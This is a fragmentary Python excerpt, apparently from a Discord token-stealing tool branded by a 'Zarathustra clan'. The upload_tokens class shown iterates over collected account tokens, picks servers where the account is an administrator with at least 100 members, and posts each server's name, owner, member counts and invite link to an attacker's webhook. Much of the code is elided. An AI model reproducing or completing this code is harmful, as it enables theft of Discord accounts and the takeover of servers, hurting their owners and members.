...
class upload_tokens:
    ...
    def upload(self):
        ...
        for token in self.tokens:
            ...
            if guilds:
                ...
                for guild in guilds:
                    ...
                    if admin and guild['approximate_member_count'] >= 100:
                        ...
                        data = f"\u200b\n**{guild['name']} ({guild['id']})** \n Owner: `{owner}` \n Members: ` ⚫ {guild['approximate_member_count']} / 🟢 {guild['approximate_presence_count']} / 🔴 {guild['approximate_member_count'] - guild['approximate_presence_count']} `\n[Join Server]({invite})"
            ...
            embed.set_footer(text="Made by the Zarathustra clan under the leadership of Legendworld")

            self.webhook.send(embed=embed, username="Zarathustra", avatar_url="https://i.imgur.com/HjzfjfR.png")
